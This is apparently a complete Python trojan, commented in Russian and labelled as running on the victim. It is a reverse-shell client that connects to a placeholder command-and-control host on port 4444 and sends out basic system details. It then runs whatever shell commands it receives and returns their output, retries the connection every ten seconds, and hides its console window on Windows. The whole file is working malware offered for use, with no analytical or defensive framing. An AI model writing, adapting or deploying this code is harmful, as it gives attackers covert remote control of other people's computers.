# client.py — троян, запускается на жертве
import socket, subprocess, os, sys, time

# ⚙️ Конфигурация (можно обновлять через GitHub!)
C2_HOST = "YOUR_NGROK_OR_LOCAL_IP"  # ← сюда вставим IP позже
C2_PORT = 4444

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            s.send(f"[+] {os.name} | {sys.platform} | {os.getcwd()}".encode())
            while True:
                cmd = s.recv(4096).decode()
                if not cmd: break
                if cmd.strip().lower() == "exit": break
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"[ERR] {str(e)}"
                s.send(output.encode()[:65000])
            s.close()
            break
        except Exception as e:
            time.sleep(10)  # Ретрай через 10 сек

if __name__ == "__main__":
    if sys.platform == "win32":
        # Скрыть окно на Windows
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    connect()
